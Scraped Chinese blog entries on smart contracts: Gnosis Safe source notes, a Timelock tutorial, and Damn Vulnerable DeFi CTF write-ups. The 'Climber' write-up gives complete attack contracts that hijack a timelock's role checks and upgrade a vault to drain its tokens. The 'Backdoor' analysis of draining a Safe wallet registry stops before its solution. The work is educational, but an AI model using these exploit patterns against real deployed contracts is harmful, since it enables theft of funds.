uint256 i; for (i = 0; i &lt; requiredSignatures; i++) &#123; (v, r, s) = signatureSplit(signatures, i); if (v == 0) &#123; // If v is 0 then it is a contract signature // When handling contract signatures the address of the contract is encoded into r currentOwner = address(uint160(uint256(r))); // Check that signature data pointer (s) is not pointing inside the static part of the signatures bytes // This check is not completely accurate, since it is possible that more signatures than the threshold are send. // Here we only check that the pointer is not pointing inside the part that is being processed require(uint256(s) &gt;= requiredSignatures.mul(65), &quot;GS021&quot;); // Check that signature data pointer (s) is in bounds (points to the length of data -&gt; 32 bytes) require(uint256(s).add(32) &lt;= signatures.length, &quot;GS022&quot;); // Check if the contract signature is in bounds: start of data is s + 32 and end is start + signature length uint256 contractSignatureLen; // solhint-disable-next-line no-inline-assembly assembly &#123; contractSignatureLen := mload(add(add(signatures, s), 0x20)) &#125; require(uint256(s).add(32).add(contractSignatureLen) &lt;= signatures.length, &quot;GS023&quot;); // Check signature bytes memory contractSignature; // solhint-disable-next-line no-inline-assembly assembly &#123; // The signature data for contract signatures is appended to the concatenated signatures and the offset is stored in s contractSignature := add(add(signatures, s), 0x20) &#125; require(ISignatureValidator(currentOwner).isValidSignature(data, contractSignature) == EIP1271_MAGIC_VALUE, &quot;GS024&quot;); &#125; else if (v == 1) &#123; // If v is 1 then it is an approved hash // When handling approved hashes the address of the approver is encoded into r currentOwner = address(uint160(uint256(r))); // Hashes are automatically approved by the sender of the message or when they have been pre-approved via a separate transaction require(msg.sender == currentOwner || approvedHashes[currentOwner][dataHash] != 0, &quot;GS025&quot;); &#125; else if (v &gt; 30) &#123; // If v &gt; 30 then default va (27,28) has been adjusted for eth_sign flow // To support eth_sign and similar we adjust v and hash the messageHash with the Ethereum message prefix before applying ecrecover currentOwner = ecrecover(keccak256(abi.encodePacked(&quot;\\x19Ethereum Signed Message:\\n32&quot;, dataHash)), v - 4, r, s); &#125; else &#123; // Default is the ecrecover flow with the provided data hash // Use ecrecover with the messageHash for EOA signatures currentOwner = ecrecover(dataHash, v, r, s); &#125; require(currentOwner &gt; lastOwner &amp;&amp; owners[currentOwner] != address(0) &amp;&amp; currentOwner != SENTINEL_OWNERS, &quot;GS026&quot;); lastOwner = currentOwner; &#125; &#125; /// @dev Allows to estimate a Safe transaction. /// This method is only meant for estimation purpose, therefore the call will always revert and encode the result in the revert data. /// Since the `estimateGas` function includes refunds, call this method to get an estimated of the costs that are deducted from the safe with `execTransaction` /// @param to Destination address of Safe transaction. /// @param value Ether value of Safe transaction. /// @param data Data payload of Safe transaction. /// @param operation Operation type of Safe transaction. /// @return Estimate without refunds and overhead fees (base transaction and payload data gas costs). /// @notice Deprecated in favor of common/StorageAccessible.sol and will be removed in next version. function requiredTxGas( address to, uint256 value, bytes calldata data, Enum.Operation operation ) external returns (uint256) &#123; uint256 startGas = gasleft(); // We don&#x27;t provide an error message here, as we use it to return the estimate require(execute(to, value, data, operation, gasleft())); uint256 requiredGas = startGas - gasleft(); // Convert response to string and return via error message revert(string(abi.encodePacked(requiredGas))); &#125; /** * @dev Marks a hash as approved. This can be used to validate a hash that is used by a signature. * @param hashToApprove The hash that should be marked as approved for signatures that are verified by this contract. */ function approveHash(bytes32 hashToApprove) external &#123; require(owners[msg.sender] != address(0), &quot;GS030&quot;); approvedHashes[msg.sender][hashToApprove] = 1; emit ApproveHash(hashToApprove, msg.sender); &#125; /// @dev Returns the chain id used by this contract. function getChainId() public view returns (uint256) &#123; uint256 id; // solhint-disable-next-line no-inline-assembly assembly &#123; id := chainid() &#125; return id; &#125; function domainSeparator() public view returns (bytes32) &#123; return keccak256(abi.encode(DOMAIN_SEPARATOR_TYPEHASH, getChainId(), this)); &#125; /// @dev Returns the bytes that are hashed to be signed by owners. /// @param to Destination address. /// @param value Ether value. /// @param data Data payload. /// @param operation Operation type. /// @param safeTxGas Gas that should be used for the safe transaction. /// @param baseGas Gas costs for that are independent of the transaction execution(e.g. base transaction fee, signature check, payment of the refund) /// @param gasPrice Maximum gas price that should be used for this transaction. /// @param gasToken Token address (or 0 if ETH) that is used for the payment. /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin). /// @param _nonce Transaction nonce. /// @return Transaction hash bytes. function encodeTransactionData( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 _nonce ) public view returns (bytes memory) &#123; bytes32 safeTxHash = keccak256( abi.encode( SAFE_TX_TYPEHASH, to, value, keccak256(data), operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, _nonce ) ); return abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash); &#125; /// @dev Returns hash to be signed by owners. /// @param to Destination address. /// @param value Ether value. /// @param data Data payload. /// @param operation Operation type. /// @param safeTxGas Fas that should be used for the safe transaction. /// @param baseGas Gas costs for data used to trigger the safe transaction. /// @param gasPrice Maximum gas price that should be used for this transaction. /// @param gasToken Token address (or 0 if ETH) that is used for the payment. /// @param refundReceiver Address of receiver of gas payment (or 0 if tx.origin). /// @param _nonce Transaction nonce. /// @return Transaction hash. function getTransactionHash( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 _nonce ) public view returns (bytes32) &#123; return keccak256(encodeTransactionData(to, value, data, operation, safeTxGas, baseGas, gasPrice, gasToken, refundReceiver, _nonce)); &#125;&#125; 2. 解读函数2.1 constructor构造器的作用是修改阈值，使本合约将不能调用自身的 setupOwners函数，以及 setup函数。 2.2 setup该函数用于初始化，初始化owner以及module。 2.3 handlePayment该函数用于转账操作，如果 paymentToken是 0 地址，则执行转ETH的操作；反之，则执行 paymentToken的transfer操作。 2.4 execTransaction执行多签事务。允许执行由所需数量的所有者确认的安全交易，然后向提交交易的帐户付款。 2.5 encodeTransactionData该函数用于处理交易数据，将交易所需的数据，入 msg.value, gas，gaslimit等进行打包，再求hash，最后返回一个bytes数组。abi.encodePacked(bytes1(0x19), bytes1(0x01), domainSeparator(), safeTxHash) ，其中，bytes1(0x19) 和 bytes1(0x01) 分别表示 EIP-191 的版本号和标准消息类型，domainSeparator 函数返回一个字节串，用于标识特定的多签钱包合约，safeTxHash 是一个 uint256 类型的值，表示交易的哈希值。 2.6 checkSignatures检查签名，签名篇到时候单独去学习一下。反正这个函数就是用来检查签名的。 2.7 requiredTxGas用于计算消耗了多少gas 2. 8 approveHash授权。 参考链接link1 最后，作者水平有限，有错请大佬们及时指出😁","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"gnosis","slug":"DEFI/gnosis","permalink":"https://biyouqiuqiu.com/categories/DEFI/gnosis/"}],"tags":[{"name":"gnosis","slug":"gnosis","permalink":"https://biyouqiuqiu.com/tags/gnosis/"}]},{"title":"Timelock","slug":"DEFI/Proxy/Timelock","date":"2023-07-20T04:47:10.000Z","updated":"2023-07-20T04:47:10.000Z","comments":true,"path":"2023/07/20/DEFI/Proxy/Timelock/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/20/DEFI/Proxy/Timelock/","excerpt":"","text":"1. 时间锁概念时间锁（Timelock）是银行金库和其他高安全性容器中常见的锁定机制。它是一种计时器，旨在防止保险箱或保险库在预设时间之前被打开，即便开锁的人知道正确密码。 在区块链，时间锁被DeFi和DAO大量采用。它是一段代码，他可以将智能合约的某些功能锁定一段时间。它可以大大改善智能合约的安全性，举个例子，假如一个黑客黑了Uniswap的多签，准备提走金库的钱，但金库合约加了2天锁定期的时间锁，那么黑客从创建提钱的交易，到实际把钱提走，需要2天的等待期。在这一段时间，项目方可以找应对办法，投资者可以提前抛售代币减少损失。 2. 时间锁合约时间锁Timelock合约 在创建Timelock合约时，项目方可以设定锁定期，并把合约的管理员设为自己。 时间锁主要有三个功能： 创建交易，并加入到时间锁队列。 在交易的锁定期满后，执行交易。 后悔了，取消时间锁队列中的某些交易。 项目方一般会把时间锁合约设为重要合约的管理员，例如金库合约，再通过时间锁操作他们。 时间锁合约的管理员一般为项目的多签钱包，保证去中心化 状态变量 admin：管理员地址。 delay：锁定期。 GRACE_PERIOD：交易过期时间。如果交易到了执行的时间点，但在GRACE_PERIOD没有被执行，就会过期。 queuedTransactions：进入时间锁队列交易的标识符txHash到bool的映射，记录所有在时间锁队列中的交易 修饰器 onlyOwner()：被修饰的函数只能被管理员执行。 onlyTimelock()：被修饰的函数只能被时间锁合约执行。 函数 构造函数：初始化交易锁定时间（秒）和管理员地址。 queueTransaction()：创建交易并添加到时间锁队列中。参数比较复杂，因为要描述一个完整的交易： target：目标合约地址 value：发送ETH数额 signature：调用的函数签名（function signature） data：交易的call data executeTime：交易执行的区块链时间戳。 调用这个函数时，要保证交易预计执行时间executeTime大于当前区块链时间戳+锁定时间delay。交易的唯一标识符为所有参数的哈希值，利用getTxHash()函数计算。进入队列的交易会更新在queuedTransactions变量中，并释放QueueTransaction事件。 executeTransaction()：执行交易。它的参数与queueTransaction()相同。要求被执行的交易在时间锁队列中，达到交易的执行时间，且没有过期。执行交易时用到了solidity的低级成员函数call，在第22讲中有介绍。 cancelTransaction()：取消交易。它的参数与queueTransaction()相同。它要求被取消的交易在队列中，会更新queuedTransactions并释放CancelTransaction事件。 changeAdmin()：修改管理员地址，只能被Timelock合约调用。 getBlockTimestamp()：获取当前区块链时间戳。 getTxHash()：返回交易的标识符，为很多交易参数的hash 代码分析： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142// SPDX-License-Identifier: MITpragma solidity ^0.8.4;contract Timelock&#123; // 事件 // 交易取消事件 event CancelTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature, bytes data, uint executeTime); // 交易执行事件 event ExecuteTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature, bytes data, uint executeTime); // 交易创建并进入队列 事件 event QueueTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature, bytes data, uint executeTime); // 修改管理员地址的事件 event NewAdmin(address indexed newAdmin); // 状态变量 address public admin; // 管理员地址 uint public constant GRACE_PERIOD = 7 days; // 交易有效期，过期的交易作废 uint public delay; // 交易锁定时间 （秒） mapping (bytes32 =&gt; bool) public queuedTransactions; // txHash到bool，记录所有在时间锁队列中的交易 // onlyOwner modifier modifier onlyOwner() &#123; require(msg.sender == admin, &quot;Timelock: Caller not admin&quot;); _; &#125; // onlyTimelock modifier modifier onlyTimelock() &#123; require(msg.sender == address(this), &quot;Timelock: Caller not Timelock&quot;); _; &#125; /** * @dev 构造函数，初始化交易锁定时间 （秒）和管理员地址 */ constructor(uint delay_) &#123; delay = delay_; admin = msg.sender; &#125; /** * @dev 改变管理员地址，调用者必须是Timelock合约。 */ function changeAdmin(address newAdmin) public onlyTimelock &#123; admin = newAdmin; emit NewAdmin(newAdmin); &#125; /** * @dev 创建交易并添加到时间锁队列中。 * @param target: 目标合约地址 * @param value: 发送eth数额 * @param signature: 要调用的函数签名（function signature） * @param data: call data，里面是一些参数 * @param executeTime: 交易执行的区块链时间戳 * * 要求：executeTime 大于 当前区块链时间戳+delay */ function queueTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public onlyOwner returns (bytes32) &#123; // 检查：交易执行时间满足锁定时间 require(executeTime &gt;= getBlockTimestamp() + delay, &quot;Timelock::queueTransaction: Estimated execution block must satisfy delay.&quot;); // 计算交易的唯一识别符：一堆东西的hash bytes32 txHash = getTxHash(target, value, signature, data, executeTime); // 将交易添加到队列 queuedTransactions[txHash] = true; emit QueueTransaction(txHash, target, value, signature, data, executeTime); return txHash; &#125; /** * @dev 取消特定交易。 * * 要求：交易在时间锁队列中 */ function cancelTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public onlyOwner&#123; // 计算交易的唯一识别符：一堆东西的hash bytes32 txHash = getTxHash(target, value, signature, data, executeTime); // 检查：交易在时间锁队列中 require(queuedTransactions[txHash], &quot;Timelock::cancelTransaction: Transaction hasn&#x27;t been queued.&quot;); // 将交易移出队列 queuedTransactions[txHash] = false; emit CancelTransaction(txHash, target, value, signature, data, executeTime); &#125; /** * @dev 执行特定交易。 * * 要求： * 1. 交易在时间锁队列中 * 2. 达到交易的执行时间 * 3. 交易没过期 */ function executeTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public payable onlyOwner returns (bytes memory) &#123; bytes32 txHash = getTxHash(target, value, signature, data, executeTime); // 检查：交易是否在时间锁队列中 require(queuedTransactions[txHash], &quot;Timelock::executeTransaction: Transaction hasn&#x27;t been queued.&quot;); // 检查：达到交易的执行时间 require(getBlockTimestamp() &gt;= executeTime, &quot;Timelock::executeTransaction: Transaction hasn&#x27;t surpassed time lock.&quot;); // 检查：交易没过期 require(getBlockTimestamp() &lt;= executeTime + GRACE_PERIOD, &quot;Timelock::executeTransaction: Transaction is stale.&quot;); // 将交易移出队列 queuedTransactions[txHash] = false; // 获取call data bytes memory callData; if (bytes(signature).length == 0) &#123; callData = data; &#125; else &#123; callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data); &#125; // 利用call执行交易 (bool success, bytes memory returnData) = target.call&#123;value: value&#125;(callData); require(success, &quot;Timelock::executeTransaction: Transaction execution reverted.&quot;); emit ExecuteTransaction(txHash, target, value, signature, data, executeTime); return returnData; &#125; /** * @dev 获取当前区块链时间戳 */ function getBlockTimestamp() public view returns (uint) &#123; return block.timestamp; &#125; /** * @dev 将一堆东西拼成交易的标识符 */ function getTxHash( address target, uint value, string memory signature, bytes memory data, uint executeTime ) public pure returns (bytes32) &#123; return keccak256(abi.encode(target, value, signature, data, executeTime)); &#125;&#125; 3. Remix演示演示 4. 参考博客WTF-TimeLock","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"}],"tags":[{"name":"Timelock","slug":"Timelock","permalink":"https://biyouqiuqiu.com/tags/Timelock/"}]},{"title":"Climber","slug":"CTFS/damn defi/Climber","date":"2023-07-20T03:37:10.000Z","updated":"2023-07-20T03:37:10.000Z","comments":true,"path":"2023/07/20/CTFS/damn defi/Climber/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/20/CTFS/damn%20defi/Climber/","excerpt":"","text":"1. issue There’s a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern. The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days. On the vault there’s an additional role with powers to sweep all tokens in case of an emergency. On the timelock, only an account with a “Proposer” role can schedule actions that can be executed 1 hour later. To pass this challenge, take all tokens from the vault. 要求：从保险库中取出所有代币 题目链接 2. analysing2.1 ClimberVault.sol在本合约中有两个函数可以从中取钱，一个是withdraw一个是sweepFunds，金库里面有10 million，而withdraw一次性只能取1个，显然该方法不可靠。所以只能通过sweepFunds一次性将所有的代币一扫而空，但是他有一个限制，便是只有sweeper，才能调用此操作，可是函数在initialize初始化中就已经将sweeper的值给设置好了，我无法修改，看似已经无解了。但是该合约是一个可升级，只要将该合约升级，且升级后的合约中sweepFunds函数没有了限制，那就可以解决了。 📌AI解读： 在使用 OpenZeppelin 升级库进行合约升级时，原来的函数仍然可以使用，但是这些函数的实现可能已经被升级合约中的新实现所覆盖。 这是因为，在使用升级库进行合约升级时，原始合约的代码和数据存储被转移到了代理合约中，并且原始合约的函数调用被重定向到代理合约。在代理合约的上下文中，所有的函数调用都会被路由到当前实现的版本。如果升级合约中的新实现与原始合约中的函数具有相同的名称，则代理合约将使用升级合约中的新实现来处理这些函数调用。 然而，如果原始合约中的函数没有被升级合约中的新实现所覆盖，则代理合约将继续使用原始合约中的函数实现来处理这些函数调用。 现在要找升级合约的入口。 2.2 ClimberTimelock.sol分析该合约咋一看，执行的逻辑是：先执行通过schedule才能执行通过execute，但仔细看 1234567891011121314for (uint8 i = 0; i &lt; targets.length;) &#123; // 调用dataElements[i]函数，发送values[i] ETH // 底层中 call 的调用者是本合约 targets[i].functionCallWithValue(dataElements[i], values[i]); unchecked &#123; ++i; &#125;&#125;if (getOperationState(id) != OperationState.ReadyForExecution) &#123; revert NotReadyForExecution(id);&#125; 先执行再判断，这就是漏洞，我们可以先通过functionCallWithValue执行schedule函数，然后就可以顺利通过接下来的断言。但是这个一个循环，且循环次数由自己确定，我便可以在里面做很多想做的事情。要执行通过schedule，的要求是调用者得是PROPOSER_ROLE，又因为_setRoleAdmin(PROPOSER_ROLE, ADMIN_ROLE)和_setupRole(ADMIN_ROLE, address(this))，使得本合约拥有对PROPOSER_ROLE成员的授权功能，所以可以将hacker授权给PROPOSER_ROLE。 📌注意： 本身grantRole函数是，ClimberTimelock合约自身的函数，按理来说，及时合约本身是 getRoleAdmin(role) 角色的管理员，但是由于在自身合约中，其无法满足onlyRole修饰器中的_checkRole(role, _msgSender())语句，但是targets[i].functionCallWithValue(dataElements[i], values[i])则是通过库合约调自己函数，这样一来，msg.sender便是ClimberTimelock本身了，这样一来就可以成功通过选择器的限制。 授权过后，将delay置零，该函数的断言 if (msg.sender != address(this))的通过原理同上。 最后将合约升级调用upgradeTo函数，该函数是在ClimberVault合约中的，可以通过如上原理通过断言require(address(this) != __self, &quot;Function must be called through delegatecall&quot;)，这里库合约的用法很是玄妙~ 捋一下，做题思路为: 123456/* 1. (grantRole) 将 PROPOSER_ROLE 的身份授予 hacker: target=timelock 2. (updateDelay) 将 delay 修改为 0: target=timelock 3. (schedule) 进行排队: target=hacker 4. (upgradeTo) 将合约升级，覆盖掉之间的 sweepFunds() 函数: target=vault*/ 3. solving3.1 ClimberHack.sol123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./ClimberVault.sol&quot;;import &quot;hardhat/console.sol&quot;;/** 编写攻击合约 */contract ClimberHack &#123; ClimberVault vault; ClimberTimelock timelock; address fakeVault; address token; address[] targets; uint256[] values; bytes[] dataElements; constructor( address _vault, address payable _timelock, address _fakeVault, address _token )&#123; vault = ClimberVault(_vault); timelock = ClimberTimelock(_timelock); fakeVault = _fakeVault; token = _token; targets = [address(timelock), address(timelock), address(this), address(vault)]; values = [0, 0, 0, 0]; dataElements = [ abi.encodeWithSignature(&quot;grantRole(bytes32,address)&quot;, PROPOSER_ROLE, address(this)), abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0), abi.encodeWithSignature(&quot;fakeSchedule()&quot;), abi.encodeWithSignature(&quot;upgradeTo(address)&quot;, fakeVault)]; &#125; function attack() external returns (bool success) &#123; timelock.execute(targets, values, dataElements, &quot;&quot;); (success, ) = address(vault).call(abi.encodeWithSignature(&quot;sweepFunds(address,address)&quot;, token, msg.sender)); &#125; function fakeSchedule() public &#123; // msg.sender = hacker timelock.schedule(targets, values, dataElements, &quot;&quot;); &#125;&#125; 3.2 FakeVault.sol12345678910111213141516171819202122// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;./ClimberVault.sol&quot;;import &quot;hardhat/console.sol&quot;;/** 待升级合约，需要覆盖掉 sweepFunds(address) 函数 */contract FakeVault is UUPSUpgradeable &#123; /** 其中状态变量的值的位置需要和ClimberVault中的位置相对应 */ uint256 private _lastWithdrawalTimestamp; address private _sweeper; /** 重写 sweepFunds() 函数覆盖调之前的 sweepFunds() 函数，丢掉 onlySweeper 限制 */ function sweepFunds(address token, address player) external &#123; console.log(&quot;fakevault&#x27;address_this = &quot;, address(this)); SafeTransferLib.safeTransfer(token, player, IERC20(token).balanceOf(address(this))); &#125; /** 这是抽象合约必须要实现的函数 */ function _authorizeUpgrade(address newImplementation) internal override &#123;&#125;&#125; 3.3 challenge.js123456789101112it(&#x27;Execution&#x27;, async function () &#123; /** CODE YOUR SOLUTION HERE */ const fakeVault = await (await ethers.getContractFactory(&quot;FakeVault&quot;, player)).deploy(); const hacker = await (await ethers.getContractFactory(&quot;ClimberHack&quot;, player)).deploy( vault.address, timelock.address, fakeVault.address, token.address ); await hacker.attack(); console.log(&quot;fakeVaule = &quot;,fakeVault.address); console.log(&quot;climberVault =&quot;, vault.address);&#125;); 运行结果 由结果不难看出我的想法是正确的，FakeVault合约的sweepFunds函数是在climberVault中执行的 其中，采用低级调用address(vault).call(abi.encodeWithSignature(&quot;sweepFunds(address,address)&quot;, token, msg.sender))，而不直直接用vault调用是因为该函数已经重写了，编译报错。 解题成功。","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"}],"tags":[{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"}]},{"title":"Backdoor","slug":"CTFS/damn defi/Backdoor","date":"2023-07-20T02:37:10.000Z","updated":"2023-07-20T02:37:10.000Z","comments":true,"path":"2023/07/20/CTFS/damn defi/Backdoor/","link":"","permalink":"https://biyouqiuqiu.com/2023/07/20/CTFS/damn%20defi/Backdoor/","excerpt":"","text":"1. issue To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens. To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks. Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them. Your goal is to take all funds from the registry. In a single transaction. 目标：在单笔交易中，将 注册表中的资金全部掏空 题目链接 2. analysing 📌 emmm，对我这个菜鸡来说，这道题难度也是相当炸裂的。在做这道题的时候我把 GnosisSafeProxy和 GnosisSafe这一系列合约都看了，把代码的逻辑弄懂，回过头来才勉勉强强可以理解题目的用意。 这道题给我带来巨大的震撼，题目代码越往深处想，带来的震撼就越大。出题人真的太牛了。 2.1 request让我们先看 challenge.js中的要求： 1234567891011121314151617181920212223242526after(async function () &#123; /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */ // Player must have used a single transaction expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1); for (let i = 0; i &lt; users.length; i++) &#123; let wallet = await walletRegistry.wallets(users[i]); // User must have registered a wallet expect(wallet).to.not.eq( ethers.constants.AddressZero, &#x27;User did not register a wallet&#x27; ); // User is no longer registered as a beneficiary expect( await walletRegistry.beneficiaries(users[i]) ).to.be.false; &#125; // Player must own all tokens expect( await token.balanceOf(player.address) ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);&#125;); 解读： 第一句断言要求玩家player只能进行一笔交易； 第二句断言要求 users[i]的钱包不能为空，可以理解为 user 成功执行了 wallets[walletOwner] = walletAddress; 第三句断言要求该 user不再是受益者，及该用户完成了注册，成功执行了beneficiaries[walletOwner] = false; 第四句断言要求玩家拿到注册表中的全部代币。 2.2 WalletRegistry.sol注册合约通读一遍可以看到涉及到转钱的操作只有proxyCreated函数。仔细分析该合约。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869function proxyCreated(GnosisSafeProxy proxy, address singleton, bytes calldata initializer, uint256) external override&#123; // 该地址的代币余额应该大于 10 ETH if (token.balanceOf(address(this)) &lt; PAYMENT_AMOUNT) &#123; // fail early revert NotEnoughFunds(); &#125; // 将代理地址修改为可接受转账的 &quot;钱包&quot; 地址 address payable walletAddress = payable(proxy); // Ensure correct factory and master copy // 调用者应该为钱包工厂，通过 GnosisiSafeProxyFactory调用 createProxyWithCallback 函数即可满足 if (msg.sender != walletFactory) &#123; revert CallerNotFactory(); &#125; // if (singleton != masterCopy) &#123; revert FakeMasterCopy(); &#125; // Ensure initial calldata was a call to `GnosisSafe::setup` // bytes4(initializer[:4]) 表示取前四个字节，保证 initializer中包含setup函数？ if (bytes4(initializer[:4]) != GnosisSafe.setup.selector) &#123; revert InvalidInitialization(); &#125; // Ensure wallet initialization is the expected // 按理来说如果 walletAddress 是只经历过部署操作得来的，那么此时的 阈值=1 uint256 threshold = GnosisSafe(walletAddress).getThreshold(); // 要求阈值为 1，才能通过 // 常规思维无疑路是被堵死的，但是我们可以冒充 GnosisSafe 合约，提供一个相同的getThreshold()函数 if (threshold != EXPECTED_THRESHOLD) &#123; revert InvalidThreshold(threshold); &#125; // 获取代理合约中的所有owner并将其存储在数组中 address[] memory owners = GnosisSafe(walletAddress).getOwners(); // 要求owners的个数不为 1 if (owners.length != EXPECTED_OWNERS_COUNT) &#123; revert InvalidOwnersCount(owners.length); &#125; // Ensure the owner is a registered beneficiary address walletOwner; unchecked &#123; walletOwner = owners[0]; &#125; if (!beneficiaries[walletOwner]) &#123; // 判断owners[0]是不是受益人 revert OwnerIsNotABeneficiary(); &#125; address fallbackManager = _getFallbackManager(walletAddress); if (fallbackManager != address(0)) revert InvalidFallbackManager(fallbackManager); // Remove owner as beneficiary beneficiaries[walletOwner] = false; // Register the wallet under the owner&#x27;s address wallets[walletOwner] = walletAddress; // Pay tokens to the newly created wallet SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);&#125; 易知，要执行 SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT)，则必须要通过前面七个断言。 逐一分析断言： if (token.balanceOf(address(this)) &lt; PAYMENT_AMOUNT)：这个不是我们考虑的，金额由题目控制。 if (msg.sender != walletFactory)：要求调用者为 GnosisSafeProxyFactory合约，分析 GnosisSafeProxyFactory合约不难知道，其中有一个函数 createProxyWithCallback调用了proxyCreated函数，且注册表是IProxyCreationCallback的实现类，所以通过调用createProxyWithCallback即可通过第二个断言。 if (singleton != masterCopy)，在调用createProxyWithCallback函数的时候传入与masterCopy相同的值。 if (bytes4(initializer[:4]) != GnosisSafe.setup.selector)：可以自己包装这个值，只要该值的前 4bytes与 setup的选择器相同即可。 GnosisSafe(walletAddress).getThreshold() != EXPECTED_THRESHOLD：这个很离谱，没有对代理合约有一定的了解的话很难理解到这里如何通过，常规思维GnosisSafe在初始化的时候就已经将threshold的值设置为 1，此时可以通过这个断言，实则不然，walletAddress是一个代理合约，返回的是代理合约的threshold的值，其值未被初始化结果是0，按理来说这个断言无法通过才对。但是回想上一个断言，调用了setup函数，里面又调用了好几个方法，其中的 setupOwners函数就很有说法，仔细分析 setupOwners函数： 12345678910111213141516function setupOwners(address[] memory _owners, uint256 _threshold) internal &#123; require(threshold == 0, &quot;GS200&quot;); require(_threshold &lt;= _owners.length, &quot;GS201&quot;); require(_threshold &gt;= 1, &quot;GS202&quot;); address currentOwner = SENTINEL_OWNERS; for (uint256 i = 0; i &lt; _owners.length; i++) &#123; address owner = _owners[i]; require(owner != address(0) &amp;&amp; owner != SENTINEL_OWNERS &amp;&amp; owner != address(this) &amp;&amp; currentOwner != owner, &quot;GS203&quot;); require(owners[owner] == address(0), &quot;GS204&quot;); owners[currentOwner] = owner; currentOwner = owner; &#125; owners[currentOwner] = SENTINEL_OWNERS; ownerCount = _owners.length; threshold = _threshold;&#125; 这个函数本身在GnosisSafe合约内，但是GnosisSafe在初始化的时候，已经将 threshold的值设置为了 1，我第一次阅读源码的时候，怎么也搞不懂这个函数的意义是什么，自己又不允许自己用，简直就是画蛇添足。直到我读了一天的题目，才明白这是解题的一个关键点，我是通过代理合约进到此函数，且在代理合约中没有该变量，所以 threshold的值默认是0，这就为我进行下一步（通过剩下的断言）奠定了基础，看到最后一行，更新threshold的值，在代理合约中 threshold的值默认是0，通过代理合约调用 getThreshold()函数，其值也是0，但是只要我们在这里修改这个值，同时也是在修改代理合约中threshold的值。将其修改为1，这样就可通过此断言。 if (owners.length != EXPECTED_OWNERS_COUNT)：要求传入的数组长度为1，简单，依ta。 if (!beneficiaries[walletOwner])：综合上一个断言，直接将题目授权的4个用户，进行遍历，挨个执行该函数即可。 if (fallbackManager != _getFallbackManager(walletAddress)：至于最后一个断言嘛，我不是很懂，但我的理解是，只有 walletAddress存储的storage变量别多的离谱大的离谱就行，不超过uint256(keccak256(&quot;fallback_manager.handler.address&quot;))即可。 到此，我已经有办法逐一突破断言，现在要考虑的是，SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT)，这行代码将 ERC20代币转入到代理合约账户里，我们知道代理合约中，没什么函数，ta都是通过逻辑合约实现功能，且ta是通过 degatecall执行函数调用的，这样一来，msg.sender永远不可能是ta自己。当然这是昨天的我的认知，被这个点折磨了两天半，通过实践我才发现。 📌在多重 delegatacall和 call结合使用的时候，如果最后一个调用的方式为call，那么，整条调用链的msg.sender将会发生改变，对于最后一个合约来说，ta的调用者为Proxy，即代理合约。这点反正靠我自己想的话，想到我G了我都想不到，所以不懂的就动手。 将上述分析综合起来，就是本题的解法了。 这是最开始的思路分析 123456789101112131415/** 思路： 1. 让每一个 user 都为我们执行 approve，以方便将user的收益转到player账户上 2. 第一个断言，不是我们能左右的 3. 第二个断言，要使调用者 msg.sender 是 walletFactory 可以通过 GnosisiSafeProxyFactory调用 createProxyWithCallback 函数即可满足 4. 第三个断言，根据合约的部署来自定义 singleton 即可 5. 第四个断言，要求bytes 类型的 initializer 前四个字节是 GnosisSafe.setup.selector 简单满足 6. 第五个断言，要求 GnosisSafe(walletAddress).getThreshold() = 1， 我们只要通过代理模式执行setup之后就可以使其等于1 7. 第六个断言，owners[0]需要是受益者，我们到时候将受益者数组传入进来即可 8. 第七个断言，我的理解是不能 walletAddress 中存储的东西即插槽别太多， 不能超过 uint256(keccak256(&quot;fallback_manager.handler.address&quot;))，否则其后的20bytes将不全为0，即address(0) */ 3. solving3.1 